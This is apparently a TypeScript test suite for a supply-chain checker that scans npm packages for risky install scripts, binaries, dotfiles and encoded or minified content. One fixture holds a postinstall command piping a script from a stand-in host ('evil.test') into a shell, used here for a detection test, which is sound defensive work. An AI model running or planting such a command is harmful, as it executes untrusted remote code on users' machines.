import test from "node:test";
import assert from "node:assert/strict";
import path from "node:path";
import { promises as fs } from "node:fs";

import { runInventoryChecks } from "../../src/inventory/checks.ts";
import { createPackageFixture } from "../helpers/package-fixture.ts";

function baseFiles() {
  return [
    {
      path: "index.js",
      fileType: "js",
      sizeBytes: 100,
      permissions: "644",
      isBinary: false,
      binaryType: null,
    },
  ];
}

test("runInventoryChecks returns a shell-pipe dealbreaker immediately", () => {
  const result = runInventoryChecks(
    {
      postinstall: "curl https://evil.test/install.sh | sh",
    },
    {
      install: [],
      runtime: ["index.js"],
      bin: [],
    },
    baseFiles(),
    "/tmp/pkg",
  );

  assert.equal(result.dealbreaker?.check, "shell-pipe");
  assert.equal(result.flags.length, 0);
});

test("runInventoryChecks returns a dealbreaker for missing install script files", () => {
  const result = runInventoryChecks(
    {
      postinstall: "node scripts/postinstall.js",
    },
    {
      install: ["scripts/postinstall.js"],
      runtime: ["index.js"],
      bin: [],
    },
    baseFiles(),
    "/tmp/pkg",
  );

  assert.equal(result.dealbreaker?.check, "missing-install-script");
});

test("runInventoryChecks emits lifecycle and non-node script flags", () => {
  const result = runInventoryChecks(
    {
      postinstall: "bash install.sh",
      prepare: "node prepare.js",
    },
    {
      install: ["prepare.js"],
      runtime: ["index.js"],
      bin: [],
    },
    [
      ...baseFiles(),
      {
        path: "prepare.js",
        fileType: "js",
        sizeBytes: 100,
        permissions: "644",
        isBinary: false,
        binaryType: null,
      },
    ],
    "/tmp/pkg",
  );

  assert.ok(result.flags.some((flag) => flag.check === "lifecycle-scripts"));
  assert.ok(result.flags.some((flag) => flag.check === "non-node-script"));
});

test("runInventoryChecks flags binaries, executables, unusual extensions, and dotfiles", () => {
  const result = runInventoryChecks(
    {},
    {
      install: [],
      runtime: ["index.js"],
      bin: [],
    },
    [
      ...baseFiles(),
      {
        path: "native-addon",
        fileType: "binary",
        sizeBytes: 1234,
        permissions: "755",
        isBinary: true,
        binaryType: "ELF",
      },
      {
        path: "scripts/run.sh",
        fileType: "shell",
        sizeBytes: 50,
        permissions: "755",
        isBinary: false,
        binaryType: null,
      },
      {
        path: "archive.weird",
        fileType: "unknown",
        sizeBytes: 50,
        permissions: "644",
        isBinary: false,
        binaryType: null,
      },
      {
        path: ".secret",
        fileType: "unknown",
        sizeBytes: 10,
        permissions: "644",
        isBinary: false,
        binaryType: null,
      },
    ],
    "/tmp/pkg",
  );

  assert.ok(result.flags.some((flag) => flag.check === "binary-detected" && flag.file === "native-addon"));
  assert.ok(result.flags.some((flag) => flag.check === "executable-outside-bin" && flag.file === "native-addon"));
  assert.ok(result.flags.some((flag) => flag.check === "executable-outside-bin" && flag.file === "scripts/run.sh"));
  assert.ok(result.flags.some((flag) => flag.check === "unusual-extension" && flag.file === "archive.weird"));
  assert.ok(result.flags.some((flag) => flag.check === "hidden-dotfile" && flag.file === ".secret"));
});

test("runInventoryChecks detects encoded content and minified install scripts", async (t) => {
  const fixture = await createPackageFixture();
  await fs.writeFile(path.join(fixture.packagePath, "data.txt"), "A".repeat(80), "utf8");
  await fs.writeFile(path.join(fixture.packagePath, "scripts", "packed.js"), "x".repeat(600), "utf8");
  t.after(async () => {
    await fixture.cleanup();
  });

  const result = runInventoryChecks(
    {
      postinstall: "node scripts/packed.js",
    },
    {
      install: ["scripts/packed.js"],
      runtime: ["index.js"],
      bin: [],
    },
    [
      ...baseFiles(),
      {
        path: "data.txt",
        fileType: "doc",
        sizeBytes: 80,
        permissions: "644",
        isBinary: false,
        binaryType: null,
      },
      {
        path: "scripts/packed.js",
        fileType: "js",
        sizeBytes: 600,
        permissions: "644",
        isBinary: false,
        binaryType: null,
      },
    ],
    fixture.packagePath,
  );

  assert.ok(result.flags.some((flag) => flag.check === "encoded-content" && flag.file === "data.txt"));
  assert.ok(result.flags.some((flag) => flag.check === "minified-install-script" && flag.file === "scripts/packed.js"));
});

test("runInventoryChecks ignores standard dotfiles", () => {
  const result = runInventoryChecks(
    {},
    {
      install: [],
      runtime: ["index.js"],
      bin: [],
    },
    [
      ...baseFiles(),
      {
        path: ".gitignore",
        fileType: "unknown",
        sizeBytes: 10,
        permissions: "644",
        isBinary: false,
        binaryType: null,
      },
      {
        path: ".eslintrc.json",
        fileType: "json",
        sizeBytes: 10,
        permissions: "644",
        isBinary: false,
        binaryType: null,
      },
    ],
    "/tmp/pkg",
  );

  assert.ok(!result.flags.some((flag) => flag.check === "hidden-dotfile"));
});
